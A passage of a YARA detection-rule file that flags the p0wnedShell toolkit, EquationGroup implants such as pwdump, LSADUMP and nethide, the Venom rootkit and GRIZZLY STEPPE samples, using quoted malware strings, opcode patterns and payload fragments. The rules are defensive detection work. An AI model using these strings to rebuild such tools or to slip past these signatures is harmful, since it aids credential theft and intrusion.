      $x2 = "wpoWAB+LCAAAAAAABADs/QeyK7uOBYhORUNIenL+E2vBA0ympH3erY4f8Tte3TpbUiY9YRbcGK91vVKtr+tV3v/B/yr/m1vD/+DvNOVb+V/f" ascii
      $x3 = "mo0MAB+LCAAAAAAABADsXQl24zqu3YqXII6i9r+xJ4AACU4SZcuJnVenf/9OxbHEAcRwcQGu62NbHsrax/Iw+3/hP5b+VzuH/4WfVeDf8n98" ascii
      $x4 = "LE4CAB+LCAAAAAAABADsfQmW2zqu6Fa8BM7D/jf2hRmkKNuVm/Tt9zunkipb4giCIGb2/prhFUt5hVe+/sNP4b+pVvwPn+OQp/LT9ge/+" ascii
      $x5 = "XpMCAB+LCAAAAAAABADsfQeWIzmO6FV0hKAn73+xL3iAwVAqq2t35r/tl53VyhCDFoQ3Y7zW9Uq1vq5Xef/CT+X/59bwFz6nKU/lp+8P/" ascii
      $x6 = "STwAAB+LCAAAAAAABADtWwmy6yoO3YqXgJjZ/8ZaRwNgx/HNfX/o7qqUkxgzCM0SmLR2jHBQzkc4En9xZbvHUuSLMnWv9ateK/70ilStR" ascii
      $x7 = "namespace p0wnedShell" fullword ascii
   condition: 
      1 of them
} 

rule p0wnedAmsiBypass_RID2D5B : DEMO HKTL T1136 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedAmsiBypass_RID2D5B.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 10:28:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Program.P0wnedPath()" fullword ascii
      $x2 = "namespace p0wnedShell" fullword ascii
      $x3 = "H4sIAAAAAAAEAO1YfXRUx3WflXalFazQgiVb5nMVryzxIbGrt/rcFRZIa1CQYEFCQnxotUhP2pX3Q337HpYotCKrPdbmoQQnkOY0+BQCNKRpe" ascii
   condition: 
      1 of them
} 

rule p0wnedShell_outputs_RID2EDA : DEMO HKTL T1136 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - from files p0wnedShell.cs, p0wnedShell.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 11:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[+] For this attack to succeed, you need to have Admin privileges." fullword ascii
      $s2 = "[+] This is not a valid hostname, please try again" fullword ascii
      $s3 = "[+] First return the name of our current domain." fullword ascii
   condition: 
      1 of them
} 

rule EquationGroup_LSADUMP_Lp_RID2FF4 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file LSADUMP_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 12:19:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "LSADUMP - - ERROR - - Injected" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
} 

rule EquationGroup_EquationDrug_ntevt_RID342B : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file ntevt.sys"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 15:19:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ntevt.sys" fullword ascii
      $s2 = "c:\\ntevt.pdb" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )
} 

rule EquationGroup_nethide_Implant_RID32D8 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file nethide_Implant.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:22:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\\\.\\dlcndi" fullword ascii
      $s2 = "s\\drivers\\" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and all of them )
} 

rule EquationGroup_EquationDrug_msgkd_RID3410 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file msgkd.ex_"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 15:14:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "KEysud" fullword ascii
      $s2 = "XWWWPWS" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_GetAdmin_Lp_RID30E7 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file GetAdmin_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 12:59:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Current user is System -- unable to join administrators group" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_pwdump_Lp_RID307B : APT DEMO EXE FILE T1003 T1136 {
   meta:
      description = "EquationGroup Malware - file pwdump_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 12:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "PWDUMP - - ERROR - -" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_ProcessOptions_Lp_RID33A9 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file ProcessOptions_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Invalid parameter received by implant" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_modifyAudit_Implant_RID3476 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file modifyAudit_Implant.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 15:31:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "LSASS.EXE" fullword wide
      $s2 = "hNtQueryInformationProcess" fullword ascii
      $s3 = "hZwOpenProcess" fullword ascii
      $s4 = ".?AVFeFinallyFailure@@" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( all of ( $s* ) ) ) or ( all of them )
} 

rule EquationGroup_modifyAudit_Lp_RID325D : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file modifyAudit_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Read of audit related process memory failed" fullword wide
      $s2 = "** This may indicate that another copy of modify_audit is already running **" fullword wide
      $s3 = "Pattern match of code failed" fullword wide
      $s4 = "Base for necessary auditing dll not found" fullword wide
      $s5 = "Security auditing has been disabled" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them ) or ( all of them )
} 

rule EquationGroup_ProcessHide_Lp_RID3237 : APT DEMO EXE FILE T1021 T1136 {
   meta:
      description = "EquationGroup Malware - file ProcessHide_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 13:55:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Invalid flag.  Can only hide or unhide" fullword wide
      $x2 = "Process elevation failed" fullword wide
      $x3 = "Unknown error hiding process" fullword wide
      $x4 = "Invalid process links found in EPROCESS" fullword wide
      $x5 = "Unable to find SYSTEM process" fullword wide
      $x6 = "Process hidden, but EPROCESS location lost" fullword wide
      $x7 = "Invalid EPROCESS location for given ID" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( 3 of them )
} 

rule EquationGroup_pwdump_Implant_RID3294 : APT DEMO EXE FILE T1003 T1136 {
   meta:
      description = "EquationGroup Malware - file pwdump_Implant.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:11:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $s8 = ".?AVFeFinallySuccess@@" fullword ascii
      $s3 = "\\system32\\win32k.sys" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_EquationDrug_Gen_5_RID33A8 : APT DEMO EXE FILE GEN T1136 {
   meta:
      description = "EquationGroup Malware - file PC_Level3_http_dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:57:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Psxssdll.dll" fullword wide
      $s2 = "Posix Server Dll" fullword wide
      $s3 = "itanium" fullword wide
      $s6 = "Copyright (C) Microsoft" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_PC_Level3_http_flav_dll_RID35A2 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file PC_Level3_http_flav_dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 16:21:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Psxssdll.dll" fullword wide
      $s2 = "Posix Server Dll" fullword wide
      $s4 = "itanium" fullword wide
      $s5 = "RHTTP/1.0" fullword wide
      $s8 = "Copyright (C) Microsoft" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_EquationDrug_mstcp32_RID3486 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file mstcp32.sys"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 15:34:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "mstcp32.sys" fullword wide
      $s2 = "p32.sys" fullword ascii
      $s3 = "\\Registry\\User\\CurrentUser\\" fullword wide
      $s4 = "\\DosDevices\\%ws" fullword wide
      $s5 = "\\Device\\%ws_%ws" fullword wide
      $s6 = "sys\\mstcp32.dbg" fullword ascii
      $s7 = "%ws%03d%ws%wZ" fullword wide
      $s8 = "TCP/IP driver" fullword wide
      $s9 = "\\Device\\%ws" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 7 of them ) or ( all of them )
} 

rule EquationGroup_nethide_Lp_RID30BF : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file nethide_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 12:53:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Error: Attempt to hide all TCP connections (any:any)." fullword wide
      $x2 = "privilegeRunInKernelMode failed" fullword wide
      $x3 = "Failed to unhide requested connection" fullword wide
      $x4 = "Nethide running in USER_MODE" fullword wide
      $x5 = "Not enough slots for all of the list.  Some entries may have not been hidden." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( all of them )
} 

rule EquationGroup_PC_Level4_flav_dll_x64_RID34C5 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file PC_Level4_flav_dll_x64"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 15:44:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wship.dll" fullword wide
      $s2 = "   IP:      " fullword ascii
      $s3 = "\\\\.\\%hs" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_PC_Level4_flav_exe_RID338A : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file PC_Level4_flav_exe"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:52:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Extended Memory Runtime Process" fullword wide
      $s2 = "memess.exe" fullword wide
      $s3 = "\\\\.\\%hs" fullword ascii
      $s4 = ".?AVOpenSocket@@" fullword ascii
      $s5 = "Corporation. All rights reserved." fullword wide
      $s6 = "itanium" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_processinfo_Implant_RID34A2 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file processinfo_Implant.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 15:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "hZwOpenProcessToken" fullword ascii
      $s2 = "hNtQueryInformationProcess" fullword ascii
      $s3 = "No mapping" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
} 

rule EquationGroup_EquationDrug_Gen_2_RID33A5 : APT DEMO EXE FILE GEN {
   meta:
      description = "EquationGroup Malware - file PortMap_Implant.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b } 
      $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 } 
      $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them )
} 

rule EquationGroup_EquationDrug_Gen_4_RID33A7 : APT DEMO EXE FILE GEN {
   meta:
      description = "EquationGroup Malware - file PC_Level4_flav_dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 11 8b da 23 df 8d 1c 9e c1 fb 02 33 da 23 df 33 } 
      $op2 = { c3 0c 57 8b 3b eb 27 8b f7 83 7e 08 00 8b 3f 74 } 
      $op3 = { 00 0f b7 5e 14 8d 5c 33 18 8b c3 2b 45 08 50 ff } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_EquationDrug_tdi6_RID3371 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file tdi6.sys"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:48:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "tdi6.sys" fullword wide
      $s3 = "TDI IPv6 Wrapper" fullword wide
      $s5 = "Corporation. All rights reserved." fullword wide
      $s6 = "FailAction" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_modifyAuthentication_Implant_RID383F : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file modifyAuthentication_Implant.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 18:13:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "LSASS.EXE" fullword wide
      $s2 = "hsamsrv.dll" fullword ascii
      $s3 = "hZwOpenProcess" fullword ascii
      $s4 = "hOpenProcess" fullword ascii
      $s5 = ".?AVFeFinallyFailure@@" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_ntfltmgr_RID3031 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file ntfltmgr.sys"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 12:29:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ntfltmgr.sys" fullword wide
      $s2 = "ntfltmgr.pdb" fullword ascii
      $s4 = "Network Filter Manager" fullword wide
      $s5 = "Corporation. All rights reserved." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_DXGHLP16_RID2EF1 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file DXGHLP16.SYS"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 11:36:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "DXGHLP16.SYS" fullword wide
      $s2 = "P16.SYS" fullword ascii
      $s3 = "\\Registry\\User\\CurrentUser\\" fullword wide
      $s4 = "\\DosDevices\\%ws" fullword wide
      $s5 = "\\Device\\%ws_%ws" fullword wide
      $s6 = "ct@SYS\\DXGHLP16.dbg" fullword ascii
      $s7 = "%ws%03d%ws%wZ" fullword wide
      $s8 = "TCP/IP driver" fullword wide
      $s9 = "\\Device\\%ws" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_RunAsChild_Lp_RID31AB : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file RunAsChild_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 13:32:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Privilege elevation failed" fullword wide
      $s2 = "Unable to open parent process" fullword wide
      $s4 = "Invalid input to lpRunAsChildPPC" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_EquationDrug_Gen_6_RID33A9 : APT DEMO EXE FILE GEN T1136 {
   meta:
      description = "EquationGroup Malware - file PC_Level3_dll_x64"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Psxssdll.dll" fullword wide
      $s2 = "Posix Server Dll" fullword wide
      $s3 = "Copyright (C) Microsoft" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_PC_Level3_http_flav_dll_x64_RID36E3 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file PC_Level3_http_flav_dll_x64"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 17:15:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Psxssdll.dll" fullword wide
      $s2 = "Posix Server Dll" fullword wide
      $s3 = ".?AVOpenSocket@@" fullword ascii
      $s4 = "RHTTP/1.0" fullword wide
      $s5 = "Copyright (C) Microsoft" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( all of ( $s* ) ) ) or ( all of them )
} 

rule EquationGroup_EquationDrug_Gen_3_RID33A6 : APT DEMO EXE FILE GEN {
   meta:
      description = "EquationGroup Malware - file mssld.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:56:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } 
      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } 
      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule EquationGroup_ModifyGroup_Lp_RID3253 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file ModifyGroup_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Modify Privileges failed" fullword wide
      $s2 = "Given privilege name not found" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_EventLogEdit_Implant_RID34A1 : APT DEMO EXE FILE T1050 T1136 {
   meta:
      description = "EquationGroup Malware - file EventLogEdit_Implant.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 15:38:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SYSTEM\\CurrentControlSet\\Services\\EventLog\\%ls" fullword wide
      $s2 = "Ntdll.dll" fullword ascii
      $s3 = "hZwOpenProcess" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_PortMap_Lp_RID30A1 : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file PortMap_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 12:48:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Privilege elevation failed" fullword wide
      $s2 = "Portmap ended due to max number of ports" fullword wide
      $s3 = "Invalid parameters received for portmap" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )
} 

rule EquationGroup_PassFreely_Lp_RID31DC : APT DEMO EXE FILE T1136 {
   meta:
      description = "EquationGroup Malware - file PassFreely_Lp.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 13:40:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Unexpected value in memory.  Run the 'CheckOracle' or 'memcheck' command to identify the problem" fullword wide
      $s2 = "Oracle process memory successfully modified!" fullword wide
      $s3 = "Unable to reset the memory protection mask to the memory" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
} 

rule EquationGroup_EquationDrug_Gen_1_RID33A4 : APT DEMO EXE FILE GEN T1136 {
   meta:
      description = "EquationGroup Malware"
      author = "Florian Roth"
      reference = "https://goo.gl/tcSoiJ"
      date = "2017-01-13 14:56:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Injection Lib -  GetProcAddress failed on Kernel32.DLL function" fullword wide
      $x2 = "Injection Lib -  JUMPUP failed to open requested process" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) ) or ( all of them )
} 

rule Venom_Rootkit_RID2C61 : APT DEMO MAL T1014 T1136 {
   meta:
      description = "Venom Linux Rootkit"
      author = "Florian Roth"
      reference = "https://security.web.cern.ch/security/venom.shtml"
      date = "2017-01-12 09:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, MAL, T1014, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%%VENOM%CTRL%MODE%%" ascii fullword
      $s2 = "%%VENOM%OK%OK%%" ascii fullword
      $s3 = "%%VENOM%WIN%WN%%" ascii fullword
      $s4 = "%%VENOM%AUTHENTICATE%%" ascii fullword
      $s5 = ". entering interactive shell" ascii fullword
      $s6 = ". processing ltun request" ascii fullword
      $s7 = ". processing rtun request" ascii fullword
      $s8 = ". processing get request" ascii fullword
      $s9 = ". processing put request" ascii fullword
      $s10 = "venom by mouzone" ascii fullword
      $s11 = "justCANTbeSTOPPED" ascii fullword
   condition: 
      filesize < 4000KB and 2 of them
} 

rule GRIZZLY_STEPPE_Malware_1_RID2F34 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file HRDG022184_certclint.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/WVflzO"
      date = "2016-12-29 11:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "S:\\Lidstone\\renewing\\HA\\disable\\In.pdb" fullword ascii
      $s2 = "Repeat last find command)Replace specific text with different text" fullword wide
      $s3 = "l\\Processor(0)\\% Processor Time" fullword wide
      $s6 = "Self Process" fullword wide
      $s7 = "Default Process" fullword wide
      $s8 = "Star Polk.exe" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 4 of them )
} 

rule GRIZZLY_STEPPE_Malware_2_RID2F35 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://goo.gl/WVflzO"
      date = "2016-12-29 11:47:21"
      score = 75
